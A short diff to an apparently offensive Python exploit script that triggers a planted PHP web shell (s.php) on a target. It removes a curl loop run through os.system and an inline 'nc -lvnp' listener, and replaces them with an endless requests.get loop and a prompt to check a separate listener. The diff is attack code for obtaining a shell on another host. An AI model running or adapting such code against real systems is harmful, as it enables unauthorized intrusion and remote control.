@@ -42,13 +42,9 @@ print("[+] Payload Sent")
 
 # Define Shell Interface
 shell_url = f'http://{target}:30455/s.php'
-def exploit(shell_url):
-    os.system(f'whilte true; do curl {shell_url}; done')
-def send_exploit():
-    threading.Thread(target=exploit(shell_url)).start()
 
 
 # Shell Handler
-print("[+] Spawning Shell")
-send_exploit()
-os.system(f'nc -lvnp {lport}')
+print("[+] Check Your Listener!")
+while True:
+    requests.get(shell_url)
